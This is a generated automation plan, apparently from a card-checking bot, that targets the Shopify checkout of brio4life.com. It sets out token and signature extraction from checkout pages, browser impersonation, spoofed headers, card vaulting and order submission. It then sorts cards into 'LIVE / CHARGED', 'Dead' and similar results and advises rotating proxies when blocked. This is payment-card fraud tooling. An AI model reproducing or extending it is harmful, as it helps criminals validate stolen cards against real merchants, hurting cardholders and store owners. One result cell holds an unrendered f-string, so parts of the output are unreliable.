# Shopify Automation Plan — brio4life.com
Generated: 2026-07-11 03:32 UTC

## Store Configuration

| Field | Value |
|-------|-------|
| Base URL | `https://brio4life.com` |
| MyShopify | `brio-product-group.myshopify.com` |
| Storefront Token | `` |
| Currency | `USD` |
| Variant ID | `41675869487181` |
| Price | `$6.95` |
| Payment Method ID | `` |
| Build ID | `` |

## Test Result (Dead Card: 4111111111111111)

| Step | Result |
|------|--------|
| Cart Add | ✅ Success |
| Checkout Page | ❌ No session_token |
| Session Token | ❌ MISSING |
| Payment Method ID | ❌ MISSING |
| Queue Token | ⚠️ Not found |
| Vault Card | ❌ Failed |
| Submit | ⚠️ Could not test |
| Poll Result | f'`N/A` — ``' if has_result else 'N/A' |

## Dynamic vs Static Fields

### STATIC (Save in DB per store):
```json
{
  "base_url":          "https://brio4life.com",
  "variant_id":        41675869487181,
  "price":             "6.95",
  "currency":          "USD",
  "payment_method_id": "",
  "storefront_token":  ""
}
```

### DYNAMIC (Extract every checkout):
| Field | How to Extract |
|-------|---------------|
| `session_token` | GET checkout page → `"sessionToken":"..."` in HTML |
| `checkout_id` | From checkout URL: `/checkouts/cn/{checkout_id}/` |
| `build_id` | From checkout HTML: `"x-checkout-web-build-id":"..."` |
| `queue_token` | From checkout HTML: `"queueToken":"..."` |
| `stable_id` | Generate fresh `uuid.uuid4()` per request |
| `delivery_handle` | Storefront GQL → cartCreate → deliveryGroups |
| `shopify_id_sig` | From checkout HTML: `"shopify-identification-signature":"..."` |

## Complete Automation Flow

```
1. cartCreate (Storefront GQL)
   → Gets: cart_id, delivery_handle, stable_id
   
2. POST /checkouts (or cartBuyerIdentityUpdate)
   → Gets: checkout_url, checkout_id (from redirect URL)

3. GET checkout page (curl_cffi chrome131 impersonation)
   → Gets: session_token, build_id, queue_token, 
           payment_method_id, shopify_id_sig

4. POST pci.shopifyinc.com/sessions (with shopify_id_sig header)
   → Gets: vault_id (card encrypted in Shopify's PCI system)

5. POST /checkouts/internal/graphql/persisted?SubmitForCompletion
   → Gets: receipt_id (if SubmitSuccess)

6. POST /checkouts/internal/graphql/persisted?PollForReceipt
   → Poll until: ProcessedReceipt (LIVE) or FailedReceipt (code → classify)
```

## Response Classification

| Poll Result | Code | Bot Status |
|-------------|------|-----------|
| `ProcessedReceipt` | (order created) | ✅ **LIVE / CHARGED** |
| `FailedReceipt` | `PAYMENT_REQUIRES_3DS` | 🔐 **3DS Required** |
| `FailedReceipt` | `INSUFFICIENT_FUNDS` | ⚠️ **Insufficient Funds** |
| `FailedReceipt` | `GENERIC_ERROR` / `DO_NOT_HONOR` | ❌ **Declined** |
| `FailedReceipt` | `CARD_DECLINED` | ❌ **Dead** |
| `SubmitRejected` | `PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE` | 🔄 **IP Block — rotate proxy** |
| `SubmitRejected` | `SESSION_REJECTED` | 🔄 **Session expired — retry** |

## Issues Found
❌ `session_token` not found — checkout page requires JavaScript rendering (use curl_cffi)
❌ `payment_method_id` not found — may need to navigate to payment step in browser first
⚠️  `queue_token` not found — may cause SubmitRejected in some stores
❌ Vault failed — check session_token and shopify-identification-signature

## Required Bot Headers

### For checkout GraphQL calls:
```
Accept: application/json
Accept-Language: en
Content-Type: application/json
Origin: https://brio4life.com
Referer: https://brio4life.com/checkouts/cn/{checkout_id}/en/payment?skip_shop_pay=true
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
sec-ch-ua-mobile: ?1
sec-ch-ua-platform: "Android"
shopify-checkout-client: checkout-web/1.0
shopify-checkout-source: id="{checkout_id}", type="cn"
User-Agent: Mozilla/5.0 (Linux; Android 15; Pixel 9) ...Chrome/150.0.0.0 Mobile Safari/537.36
x-checkout-one-session-token: {session_token}
x-checkout-web-build-id: {build_id}
x-checkout-web-deploy-stage: production
x-checkout-web-server-handling: fast
x-checkout-web-server-rendering: yes
x-checkout-web-source-id: {checkout_id}
```

### For PCI vault:
```
Authorization: Bearer "{session_token}"
shopify-identification-signature: {shopify_id_sig}
Origin: https://checkout.pci.shopifyinc.com
```
